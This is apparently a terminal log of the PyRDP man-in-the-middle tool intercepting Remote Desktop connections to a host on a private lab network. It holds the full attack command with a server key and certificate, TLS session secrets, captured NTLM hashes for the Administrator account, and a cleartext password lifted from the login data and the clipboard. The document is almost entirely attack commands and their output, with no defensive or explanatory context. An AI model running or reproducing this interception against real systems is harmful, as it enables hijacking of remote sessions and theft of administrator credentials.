```
$ pyrdp-mitm.py -k LOCAL_MACHINE_Remote\ Desktop_0_pyrdp-server.key -c LOCAL_MACHINE_Remote\ Desktop_0_pyrdp-server.pem --auth ssp 192.168.1.136
/home/user/.local/bin/pyrdp-mitm.py:15: DeprecationWarning: There is no current event loop
  asyncioreactor.install(asyncio.get_event_loop())
[2022-10-22 12:58:33,871] - INFO - GLOBAL - pyrdp.mitm - Target: 192.168.1.136:3389
[2022-10-22 12:58:33,872] - INFO - GLOBAL - pyrdp.mitm - Output directory: /home/user/pyrdp_output
[2022-10-22 12:58:33,874] - INFO - GLOBAL - pyrdp - MITM Server listening on 0.0.0.0:3389
[2022-10-22 12:58:39,096] - INFO - Gene453836 - pyrdp.mitm.connections.tcp - New client connected from 192.168.1.137:50690
[2022-10-22 12:58:39,097] - INFO - Gene453836 - pyrdp.mitm.connections.x224 - Cookie: mstshash=Administr
[2022-10-22 12:58:39,100] - INFO - Gene453836 - pyrdp.mitm.connections.tcp - Server connected
CLIENT_RANDOM 6353cce5ae54d9559ed22d5f9ae724d5531b4b4087868cb95f5dac6fc2689117 05ca043b02ee737eb6f98fa162a4405edf39651050254224599cf742be4f78ed9d02d9d0da598f45179ce116a0b3d88d
CLIENT_RANDOM 83ed56bbcffd10a44ee775dfd0fc5538d5cee0e66f360737c3b853d6f8a91f5c f673e64753730eeea8a5fd0b2db7bea8093f5ee8f7948f95db1a2ef12e38cee687a368096ef818424c7f7293490a2b75
[2022-10-22 12:58:45,870] - INFO - Gene453836 - pyrdp.mitm.connections.ntlmssp - [!] NTLMSSP Hash: Administrator::PYRDP-CLIENT:eecf154014a96af3:b4cab38152b36eb68d13a7e4b5377dfd:0101000000000000317bac4105e6d801789d104e17ae3b450000000002001800500059005200440050002d0053004500520056004500520001001800500059005200440050002d0053004500520056004500520004001800700079007200640070002d0073006500720076006500720003001800700079007200640070002d0073006500720076006500720007000800317bac4105e6d80106000400020000000800300030000000000000000100000000200000e18514279b6bd7b29e51a59434c88e7a83f26dc6f8ad2feb323eb839c2f2f8b70a0010000000000000000000000000000000000009002a005400450052004d005300520056002f003100390032002e003100360038002e0031002e003100330038000000000000000000
[2022-10-22 12:58:45,886] - INFO - Gene453836 - pyrdp.mitm.connections.tcp - Client connection closed. Connection to the other side was lost in a non-clean fashion: Connection lost.
[2022-10-22 12:58:45,888] - INFO - Gene453836 - pyrdp.mitm.connections.tcp - Connection report: report: 1.0, connectionTime: 6.790112018585205, totalInput: 0, totalOutput: 0, replayFilename: rdp_replay_20221022_12-58-39_95_Gene453836.pyrdp
[2022-10-22 12:58:50,894] - INFO - Wilma482359 - pyrdp.mitm.connections.tcp - New client connected from 192.168.1.137:50691
[2022-10-22 12:58:50,895] - INFO - Wilma482359 - pyrdp.mitm.connections.x224 - Cookie: mstshash=Administr
[2022-10-22 12:58:50,897] - INFO - Wilma482359 - pyrdp.mitm.connections.tcp - Server connected
CLIENT_RANDOM 6353cceba4eece6e09bd67cd9dd441fdff22f267adadde308f19907e3e3b202a f649f4d28075282c618343f8e63e47afecfa110f579463d6dfda1f04f9b7e1659a8e737064ae7eb63ef6678cd1d0d8cc
CLIENT_RANDOM c4aa8e85e7f7662fc859ebf050c1427b2d38724d6f5b888a09006d934e6fe7e9 508787fae318c46bd7973457fa8d8b8100ced58a042d76abb5ad94b278d5fc525684562a960533b07e434241049151d6
[2022-10-22 12:58:51,937] - INFO - Wilma482359 - pyrdp.mitm.connections.ntlmssp - [!] NTLMSSP Hash: Administrator::PYRDP-CLIENT:f5531ff48da405f2:a3449136c4f8e001f3c81e0d5b29a235:01010000000000001ade4b4505e6d8011aa4440519ea05380000000002001800500059005200440050002d0053004500520056004500520001001800500059005200440050002d0053004500520056004500520004001800700079007200640070002d0073006500720076006500720003001800700079007200640070002d00730065007200760065007200070008001ade4b4505e6d80106000400020000000800300030000000000000000100000000200000e18514279b6bd7b29e51a59434c88e7a83f26dc6f8ad2feb323eb839c2f2f8b70a0010000000000000000000000000000000000009002a005400450052004d005300520056002f003100390032002e003100360038002e0031002e003100330038000000000000000000
[2022-10-22 12:58:51,944] - INFO - Wilma482359 - pyrdp.mitm.connections.mcs - Client hostname PYRDP-CLIENT
[2022-10-22 12:58:51,959] - INFO - Wilma482359 - pyrdp.mitm.connections.mcs - rdpdr <---> Channel #1004
[2022-10-22 12:58:51,959] - INFO - Wilma482359 - pyrdp.mitm.connections.mcs - rdpsnd <---> Channel #1005
[2022-10-22 12:58:51,960] - INFO - Wilma482359 - pyrdp.mitm.connections.mcs - cliprdr <---> Channel #1006
[2022-10-22 12:58:51,960] - INFO - Wilma482359 - pyrdp.mitm.connections.mcs - drdynvc <---> Channel #1007
[2022-10-22 12:58:52,011] - INFO - Wilma482359 - pyrdp.mitm.connections.security - Client Info: username = 'Administrator\x00', password = 'rieToh9p\x00', domain = '\x00', clientAddress = '192.168.1.137\x00'
[2022-10-22 12:58:53,573] - INFO - Wilma482359 - pyrdp.mitm.connections.cliprdr - Clipboard data: 'rieToh9p\x00'
[2022-10-22 12:58:53,905] - INFO - Wilma482359 - pyrdp.mitm.connections.rdpdr - Smart card mapped with ID 1: SCARD
[2022-10-22 12:58:54,041] - INFO - Wilma482359 - pyrdp.mitm.connections.rdpdr - Printer mapped with ID 4: PRN4
[2022-10-22 12:58:54,054] - INFO - Wilma482359 - pyrdp.mitm.connections.rdpdr - Printer mapped with ID 5: PRN5
[2022-10-22 12:58:54,065] - INFO - Wilma482359 - pyrdp.mitm.connections.rdpdr - Printer mapped with ID 3: PRN3
[2022-10-22 12:58:54,066] - INFO - Wilma482359 - pyrdp.mitm.connections.rdpdr - Printer mapped with ID 2: PRN2
[2022-10-22 12:59:31,112] - INFO - Wilma482359 - pyrdp.mitm.connections.server.slowpath - The disconnection was initiated by the user logging off his or her session on the server.
[2022-10-22 12:59:31,314] - INFO - Wilma482359 - pyrdp.mitm.connections.tcp - Client connection closed. Connection to the other side was lost in a non-clean fashion: Connection lost.
[2022-10-22 12:59:31,314] - INFO - Wilma482359 - pyrdp.mitm.connections.tcp - Connection report: report: 1.0, connectionTime: 40.41965436935425, mcs: 411, mcsInput: 219, mcsInput_1003: 9, mcsOutput: 192, mcsOutput_1003: 9, slowPathOutput: 8, slowPathInput: 8, mcsOutput_1007: 169, virtualChannel: 169, virtualChannelOutput: 169, fastPathOutput: 299, fastPathInput: 153, mcsInput_1007: 168, virtualChannelInput: 168, mcsOutput_1006: 4, clipboard: 7, clipboardServer: 4, mcsInput_1006: 3, clipboardClient: 3, clipboardCopies: 1, mcsOutput_1004: 10, deviceRedirection: 15, deviceRedirectionServer: 10, mcsInput_1004: 39, deviceRedirectionClient: 5, deviceRedirectionIORequest: 1, totalInput: 548, totalOutput: 674, clientServerRatio: 0.8130563798219584, replayFilename: rdp_replay_20221022_12-58-50_894_Wilma482359.pyrdp
^C[2022-10-22 12:59:37,041] - INFO - GLOBAL - pyrdp - MITM terminated
[2022-10-22 12:59:37,041] - INFO - GLOBAL - pyrdp.mitm - Target: 192.168.1.136:3389
[2022-10-22 12:59:37,041] - INFO - GLOBAL - pyrdp.mitm - Output directory: /home/user/pyrdp_output
```